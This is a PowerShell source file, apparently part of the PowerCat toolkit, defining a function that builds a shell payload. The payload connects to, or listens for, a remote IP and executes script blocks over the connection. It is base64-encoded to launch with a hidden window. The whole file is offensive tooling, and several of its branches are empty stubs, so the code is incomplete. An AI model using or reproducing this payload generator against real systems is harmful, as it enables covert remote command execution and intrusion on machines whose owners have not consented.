function New-PowerCatPayload {
[CmdletBinding(DefaultParameterSetName = 'Execute')]
    Param (
        [Parameter(Position = 0)]
        [Alias('m')]
        [ValidateSet('Smb', 'Tcp', 'Udp')]
        [String]$Mode = 'Tcp',

        [Parameter()]
        [Switch]$Listener,
        
        [Parameter(ParameterSetName = 'Execute')]
        [Alias('e')]
        [Switch]$Execute,
        
        [Parameter(ParameterSetName = 'Relay')]
        [Alias('r')]
        [String]$Relay,

        [Parameter(ParameterSetName = 'ReceiveFile')]
        [Alias('rf')]
        [String]$ReceiveFile,
    
        [Parameter(ParameterSetName = 'SendFile')]
        [Alias('sf')]
        [String]$SendFile,
    
        [Parameter()]
        [Alias('d')]
        [Switch]$Disconnect,
    
        [Parameter()]
        [Alias('k')]
        [Switch]$KeepAlive,
    
        [Parameter()]
        [Alias('t')]
        [Int]$Timeout = 60,
        
        [Parameter()]
        [ValidateSet('Ascii','Unicode','UTF7','UTF8','UTF32')]
        [String]$Encoding = 'Ascii'
    )
    DynamicParam {
        $ParameterDictionary = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        
        if ($Mode -eq 'Smb') { $PipeNameParam = New-RuntimeParameter -Name PipeName -Type String -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary }
        else { $PortParam = New-RuntimeParameter -Name Port -Type Int -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary }
        
        if (!$Listener.IsPresent) {
            $Ipv4 = [regex]"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
            $RemoteIpParam = New-RuntimeParameter -Name RemoteIp -Type String -Mandatory -Position 2 -ValidatePattern $Ipv4 -ParameterDictionary $ParameterDictionary
        }
        
        if ($Execute.IsPresent -and $Mode -eq 'Udp') { 
            $ScriptBlockParam = New-RuntimeParameter -Name ScriptBlock -Type ScriptBlock -Mandatory -ParameterDictionary $ParameterDictionary 
            $ArgumentListParam = New-RuntimeParameter -Name ArgumentList -Type Object[] -ParameterDictionary $ParameterDictionary 
        }
        elseif ($Execute.IsPresent) { 
            $ScriptBlockParam = New-RuntimeParameter -Name ScriptBlock -Type ScriptBlock -ParameterDictionary $ParameterDictionary 
            $ArgumentListParam = New-RuntimeParameter -Name ArgumentList -Type Object[] -ParameterDictionary $ParameterDictionary 
        }
        return $ParameterDictionary
    }

    Begin {
        $PayloadString = 'function Write-NetworkStream {' + ${function:Write-NetworkStream} + '}'
        $PayloadString += 'function Read-NetworkStream {' + ${function:Read-NetworkStream} + '}'
        $PayloadString += 'function Close-NetworkStream {' + ${function:Close-NetworkStream} + '}'
        if ($Listener.IsPresent) { 
            $PayloadString += 'function Start-PowerCat {' + ${function:Start-PowerCat} + "}`n"
            $PayloadString += "Start-PowerCat $Mode $($ParameterDictionary.Port.Value) $($ParameterDictionary.PipeName.Value)"
        }
        else { 
            $PayloadString += 'function Connect-PowerCat {' + ${function:Connect-PowerCat} + "}`n"
            $PayloadString += "Connect-PowerCat $Mode $($ParameterDictionary.Port.Value) $($ParameterDictionary.PipeName.Value) $($ParameterDictionary.RemoteIp.Value)"
        }
    }
    Process {
        if ($PSCmdlet.ParameterSetName -eq 'Execute') { 
            $PayloadString += ' -Execute'
            if ($ParameterDictionary.ScriptBlock.Value) { $PayloadString += " -ScriptBlock $($ParameterDictionary.ScriptBlock.Value)" }
            if ($ParameterDictionary.ArgumentList.Value) { $PayloadString += " -ArgumentList $($ParameterDictionary.ArgumentList.Value)" }
        }
        elseif ($PSCmdlet.ParameterSetName -eq 'Relay') {

        }
        elseif ($PSCmdlet.ParameterSetName -eq 'SendFile') {

        }
        elseif ($PSCmdlet.ParameterSetName -eq 'ReceiveFile') {

        }
        if ($KeepAlive.IsPresent) { }
        elseif ($Disconnect.IsPresent) { }
        if ($PSBoundParameters.Timeout) { }
        if ($PSBoundParameters.Encoding) { }

        $ScriptBlock = [ScriptBlock]::Create($PayloadString)

        # Base64 encode script so it can be passed as a command-line argument
        $EncodedPayload = Out-EncodedCommand -NoProfile -NonInteractive -WindowStyle Hidden -ScriptBlock $ScriptBlock
    }
    End {}
}